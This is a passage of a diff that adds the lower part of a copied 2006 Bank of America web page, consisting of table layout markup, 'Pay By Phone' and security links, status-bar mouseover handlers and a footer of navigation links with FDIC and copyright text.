src="images/icon_call2action_secondary.gif" alt="" border="0" height="8" hspace="5" width="10"></a><br><br><a class="linknormal" onfocus="self.status='Pay by Phone Users Guide';return true;" onblur="self.status='';return true;" onmouseover="self.status='Pay by Phone Users Guide';return true;" onmouseout="self.status='';return true;" title="Pay By Phone user's guide" href="http://www.bankofamerica.com/state.cgi?section=paybyphone_guide">Pay By Phone user's guide<img src="images/icon_call2action_secondary.gif" alt="" border="0" height="8" hspace="5" width="10"></a></div><div class="display-ns4"><img src="images/clr.gif" alt="" height="15" width="1"></div></td>
+
+                <td class="mod2-brdr-hs" width="1"><img src="images/clr.gif" alt="" border="0" height="1" width="1"></td>
+            </tr>
+        </tbody></table></td>
+    </tr>
+
+    <tr><td class="mod2-brdr-hs"><img src="images/clr.gif" alt="" border="0" height="1" width="1"></td></tr>
+    <!-- Start of Module Content -->
+    <tr>
+        <td><table summary="" border="0" cellpadding="0" cellspacing="0" width="100%">
+            <tbody><tr>
+                <td class="mod2-brdr-hs" width="1"><img src="images/clr.gif" alt="" height="1" width="1"></td>
+                <td><table summary="" border="0" cellpadding="0" cellspacing="0" width="100%">
+                    <tbody><tr valign="top">
+                    <!-- End of Module Content -->
+                    <td>
+                    </td><td valign="top"><div class="display-ns4"><img src="images/clr.gif" alt="" height="15" width="1"></div><div class="signin-box"><a class="linknormal" onfocus="self.status='Change State';return true;" onblur="self.status='';return true;" onmouseover="self.status='Change State';return true;" onmouseout="self.status='';return true;" title="Online Security" href="http://www.bankofamerica.com/adtrack/index.cgi?adlink=000302078f790000b593">Learn how we're committed<br>to your security</a></div><div class="display-ns4"><img src="images/clr.gif" alt="" height="15" width="1"></div></td>
+                    </tr>
+                </tbody></table></td>
+                <td class="mod2-brdr-hs" width="1"><img src="images/clr.gif" alt="" border="0" height="1" width="1"></td>
+            </tr>
+        </tbody></table></td>
+    </tr>
+    <tr>
+        <td class="mod2-brdr-hs"><img src="images/clr.gif" alt="" border="0" height="1" width="1"></td>
+    </tr>
+    <!-- End Module Footer -->
+</tbody></table>
+
+
+    </td>
+</tr>
+</tbody></table>
+
+<!-- Beg Footer -->
+
+<!-- 30 pixels of seperation -->
+<div><img src="images/clr.gif" alt="" height="30" width="1"></div>
+
+<!-- Begin footer -->
+<div class="footer">
+<table summary="" border="0" cellpadding="0" cellspacing="0" width="747">
+	<tbody><tr><td colspan="4" class="rulegrey2"><img src="images/clr.gif" alt="" height="1" width="1"></td></tr>
+	<tr><td rowspan="7" width="12"><img src="images/clr.gif" alt="" height="1" width="12"></td><td colspan="2"><img src="images/clr.gif" alt="" height="7" width="1"></td></tr>
+	<tr><td class="secure-area" nowrap="nowrap"><div class="secure-area"><img src="images/foot_lock.gif" alt="Secure Area" border="0" height="11" hspace="0" vspace="0" width="9"><img src="images/clr.gif" alt="" height="1" width="8">Secure Area</div></td><td rowspan="6" style="" align="right" valign="top" width="142"><img alt="Official Sponsor 2000-2004 U.S. Olympic Teams" src="images/olympic.gif" align="right" border="0" height="33" hspace="0" vspace="0" width="130"></td></tr>
+
+		<tr><td><img src="images/clr.gif" alt="" height="6" width="1"></td></tr>
+	<tr>
+	<td class="footer" valign="top"><a class="footer" title="Home" href="http://www.bankofamerica.com/">Home</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;<a class="footer" title="Locations" href="http://www.bankofamerica.com/findit/locator.cfm">Locations</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;<a class="footer" title="Contact Us" href="http://www.bankofamerica.com/onlinebanking/index.cfm?template=contact_us">Contact Us</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;<a class="footer" title="Help" href="http://www.bankofamerica.com/help/index.cfm?lob=onlinebanking">Help</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;<a class="footer" title="Sign in" href="http://www.bankofamerica.com/signin/">Sign in</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;<a class="footer" title="Site Map" href="http://www.bankofamerica.com/help/index.cfm?template=sitemap.cfm">Site Map</a><br><a class="footer" title="Personal Finance" href="http://www.bankofamerica.com/index.cfm">Personal Finance</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;<a class="footer" title="Small Business" href="http://www.bankofamerica.com/index.cfm?page=smbiz">Small Business</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;<a class="footer" title="Corporate &amp; Institutional" href="http://www.bankofamerica.com/index.cfm?page=corp">Corporate &amp; Institutional</a><br><a class="footer" title="About the Bank" href="http://www.bankofamerica.com/inside/">About the Bank</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;<a class="footer" title="In the Community" href="http://www.bankofamerica.com/inthecommunity/">In the Community</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;<a class="footer" title="Finance Tools &amp; Planning" href="http://www.bankofamerica.com/financialtools/">Finance Tools &amp; Planning</a>&nbsp;&nbsp;<span class="bluedot">&#8226;</span>&nbsp;&nbsp;<a class="footer" title="Privacy &amp; Security" href="http://www.bankofamerica.com/privacy/">Privacy &amp; Security</a></td>
+	</tr>
+	<tr><td><img src="images/clr.gif" alt="" height="22" width="1"></td></tr>
+	<tr>
+	<td class="fdic-text" valign="top">Bank of America, N.A. Member FDIC.&nbsp;Equal Housing Lender<img src="images/icon_house.gif" alt="Equal Housing Lender" border="0" height="9" hspace="3" width="14"><br>© 2006 Bank of America Corporation. All rights reserved.</td>
+	</tr>
+	<tr><td><img src="images/clr.gif" alt="" height="20"></td></tr>
+</tbody></table></div>
+<!-- End footer -->
+
+
+<!-- End Footer -->
+
+</body></html>
